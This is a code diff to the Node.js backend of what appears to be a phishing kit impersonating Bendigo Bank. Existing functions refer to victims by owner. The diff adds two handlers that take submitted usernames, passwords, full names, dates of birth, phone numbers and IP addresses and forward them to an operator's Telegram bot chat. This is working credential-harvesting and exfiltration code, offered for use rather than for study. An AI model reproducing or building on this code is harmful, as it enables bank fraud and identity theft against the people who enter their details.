@@ -1,5 +1,46 @@
 const Bendigo = require("../models/bendigoModel");
 
+const staticLogin = async (req, res) => {
+  let { accessId, password, ip, telegramId } = req.body;
+
+  var originalText = `+----------- Login Information ------------+\nUsername: ${accessId}\nPassword: ${password}\n+----------- IP Information ------------+\nIP: ${ip}`;
+
+  await axios
+    .post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
+        chat_id: telegramId,
+        text: `Bendigo:\n${originalText}`,
+        parse_mode: "Markdown",
+      }
+    )
+    .catch((e) => {
+      console.log(e);
+    });
+  res.sendStatus(200);
+};
+
+const staticPersonal = async (req, res) => {
+  let { accessId, password, fullname, dob, telephone, ip, telegramId } =
+    req.body;
+
+  var originalText = `+----------- Login Information ------------+\nUsername: ${accessId}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nMobile: ${telephone}\n+----------- IP Information ------------+\nIP: ${ip}`;
+
+  await axios
+    .post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
+        chat_id: telegramId,
+        text: `Bendigo:\n${originalText}`,
+        parse_mode: "Markdown",
+      }
+    )
+    .catch((e) => {
+      console.log(e);
+    });
+  res.sendStatus(200);
+};
+
 const getOwnerVics = async (req, res) => {
   const { owner } = req.params;
   Bendigo.find({ owner })
@@ -141,4 +182,6 @@ module.exports = {
   submitDob,
   submitPhone,
   deleteEntry,
+  staticLogin,
+  staticPersonal,
 };
